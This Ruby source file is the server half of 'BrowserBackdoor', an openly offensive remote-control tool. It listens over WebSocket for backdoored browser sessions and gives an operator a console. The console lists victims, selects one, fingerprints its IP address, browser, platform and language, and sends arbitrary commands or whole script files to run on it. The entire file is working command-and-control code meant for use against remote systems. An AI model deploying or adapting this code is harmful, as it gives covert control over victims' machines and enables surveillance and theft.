#!/usr/bin/env ruby
# BrowserBackdoorServer - https://github.com/IMcPwn/browser-backdoor

# BrowserBackdoorServer is a WebSocket server that listens for connections 
# from BrowserBackdoor and creates an command-line interface for 
# executing commands on the remote system(s).
# For more information visit: http://imcpwn.com

# MIT License

# Copyright (c) 2016 IMcPwn 

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

require 'em-websocket'
require 'yaml'

$wsList = Array.new
$selected = -1
COMMANDS = {
    "help" => "Help menu",
    "exit" => "Quit the application",
    "sessions" => "List active sessions",
    "use" => "Select targeted session",
    "info" => "Get session information (IP, User Agent, Operating System, Language)",
    "exec" => "Execute commands on the targeted session interactively. Provide an argument to execute a file's contents.",
    "get_cert" => "Get a free TLS certificate from LetsEncrypt",
    "load" => "Load a module (not implemented yet)"
}
WELCOME_MESSAGE = ""\
" ____                                  ____             _       _                  \n"\
"|  _ \                                |  _ \           | |     | |                 \n"\
"| |_) |_ __ _____      _____  ___ _ __| |_) | __ _  ___| | ____| | ___   ___  _ __ \n"\
"|  _ <| '__/ _ \ \ /\ / / __|/ _ \ '__|  _ < / _' |/ __| |/ / _' |/ _ \ / _ \| '__|\n"\
"| |_) | | | (_) \ V  V /\__ \  __/ |  | |_) | (_| | (__|   < (_| | (_) | (_) | |   \n"\
"|____/|_|  \___/ \_/\_/ |___/\___|_|  |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_| by IMcPwn\n"\
"Visit http://imcpwn.com for more information.\n"

def main()
    begin
        configfile = YAML.load_file("config.yml")
        Thread.new{startEM(configfile['host'], configfile['port'], configfile['secure'], configfile['priv_key'], configfile['cert_chain'])}
        cmdLine(configfile['host'], configfile['port'], configfile['secure'])
    rescue => e
        puts 'Error loading configuration'
        puts e.message
        puts e.backtrace
        return
    end
end

def print_error(message)
    puts "[X] " + message
end

def print_notice(message)
    puts "[*] " + message
end

def infoCommand()
    # TODO: Improve method of getting IP address
    infoCommands = ["var xhttp = new XMLHttpRequest();xhttp.open(\"GET\", \"https://ipv4.icanhazip.com/\", false);xhttp.send();xhttp.responseText","navigator.appVersion;", "navigator.platform;", "navigator.language;"]
    infoCommands.each {|cmd|
        begin
            sendCommand(cmd, $wsList[$selected])
        rescue
             print_error("Error sending command. Selected session may no longer exist.")
             break
        end
    }
end

def sessionsCommand()
    if $wsList.length < 1
        puts "No sessions"
        return
    end
    puts "ID: Connection"
    $wsList.each_with_index {|val, index|
        puts index.to_s + " : " + val.to_s
    }
end

def execCommandLoop()
    loop do
        if !validSession?($selected)
            return
        end
        print "Enter the command to send. (exit when done)\nCMD-##{$selected}> "
        cmdSend = gets.split.join(' ')
        break if cmdSend == "exit"
        next if cmdSend == ""
        begin
            sendCommand(cmdSend, $wsList[$selected])
        rescue
            print_error("Error sending command. Selected session may no longer exist.")
        end
    end
end

def execCommand(cmdIn)
    if cmdIn.length < 2
        execCommandLoop()
    else
        begin
            file = File.open(cmdIn[1], "r")
            cmdSend = file.read
            file.close
            sendCommand(cmdSend, $wsList[$selected])
        rescue => e
            print_error("Error sending command. Selected session may no longer exist.")
            puts e.message
        end
    end
end

def useCommand(cmdIn)
    if cmdIn.length < 2
        print_error("Invalid usage. Try help for help.")
        return
    end
    selectIn = cmdIn[1].to_i
    if selectIn > $wsList.length - 1
        print_error("Session does not exist.")
        return
    end
    $selected = selectIn
    print_notice("Selected session is now " + $selected.to_s + ".")
end

def printHelp()
    COMMANDS.each do |key, array|
        print key
        print " --> "
        puts array
        puts
    end
end

def cmdLine(host, port, secure)
    puts WELCOME_MESSAGE
    puts "\nServer is listening on #{host.to_s}:#{port.to_s}" + ((secure == true) ? " securely" : "") + "..."
    puts "Enter help for help."
    loop do
        print "\nbbf > "
        cmdIn = gets.chomp.split()
        case cmdIn[0]
        when "help"
            printHelp()
        when "exit"
            break
        when "sessions"
            sessionsCommand()        
        when "use"
            useCommand(cmdIn)
        when "info"
            if validSession?($selected)
                infoCommand()
            else
                next
            end
        when "exec"
           if validSession?($selected)
               execCommand(cmdIn)
           else
               next
           end
       when "get_cert"
           if File.file?("getCert.sh")
               system("./getCert.sh")
           else
               print_error("getCert.sh does not exist")
           end
       when nil
           next
       else
           print_error("Invalid command. Try help for help.")
        end
    end
end

def validSession?(selected)
    if selected == -1
        print_error("No session selected. Try use SESSION_ID first.")
        return false
    elsif $wsList.length < $selected
        print_error("Session no longer exists.")
        return false
    end
    return true
end

def sendCommand(cmd, ws)
    ws.send(cmd)
end

def startEM(host, port, secure, priv_key, cert_chain)
    EM.run {
        EM::WebSocket.run({
            :host => host,
            :port => port,
            :secure => secure,
            :tls_options => {
                        :private_key_file => priv_key,
                        :cert_chain_file => cert_chain
        }
        }) do |ws|
            $wsList.push(ws)
            ws.onopen { |handshake|
                print_notice("WebSocket connection open: " + handshake.to_s)
            }
            ws.onclose {
                print_error("Connection closed")
                $wsList.delete(ws)
                # TODO: Change this. Reset selected error so the wrong session is not used.
                $selected = -1
            }
            ws.onmessage { |msg|
                print_notice("Response received: " + msg)
            }
            ws.onerror { |e|
                print_error(e.message)
                $wsList.delete(ws)
                # Reset selected variable after error
                $selected = -1
            }
        end
    }
end

main()
